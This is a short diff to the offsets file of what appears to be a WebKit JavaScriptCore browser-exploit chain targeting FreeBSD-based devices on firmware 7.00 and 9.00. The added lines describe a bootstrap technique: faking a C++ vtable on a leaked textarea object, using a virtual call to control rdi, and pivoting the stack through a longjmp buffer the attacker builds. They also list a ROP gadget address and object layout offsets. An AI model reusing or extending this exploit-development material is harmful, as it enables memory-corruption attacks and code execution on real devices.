@@ -84,6 +84,21 @@ const OFFSET_wk_r9_zero_only             = true;
 // swapped.  ZF is unaffected by the swap, so branch_types.EQUAL (the only
 // type the engine uses) is exact; rop.js throws on the ordered types.
 const OFFSET_wk_cmp_operands_reversed    = true;
+
+// --- 7.00 bootstrap: the idle-Worker hijack does not work on JSC 613 --------
+// The Worker never parks at a return address any stack scan can find (its wait
+// is a raw syscall; the PLT is `jmp [GOT]`, so nothing rets through a slot we
+// control). Instead we fake a C++ vtable on the leaked textarea impl, take one
+// virtual dispatch to get `rdi = this`, and pivot with longjmp. main.js runs a
+// non-destructive milestone first to confirm the virtual call and find the
+// trigger op; OFFSET_wk_vtable_trigger is filled in once the device reports it.
+const OFFSET_wk_bootstrap                 = "fakevtable";
+// mov rsp, rdi ; ret  -- the pivot for a `rdi = this` virtual call (fallback;
+// longjmp is used as the primary pivot since its jmp_buf is fully attacker-built:
+// +0x00 rip, +0x10 rsp, standard FreeBSD amd64 layout, confirmed in libc 613).
+const OFFSET_wk_stack_pivot_mov_rsp_rdi   = 0x0080C579;
+// set once the milestone reports which JS/DOM op yielded the virtual call
+const OFFSET_wk_vtable_trigger            = "";
 // 7.00's JSC is 613.1; 9.00+ is 616.1. JSArrayBufferView gained a
 // `size_t m_byteOffset` member between them, so the tail differs:
 //   613: +0x18 size_t m_length, +0x20 uint32 m_mode              sizeof 0x28
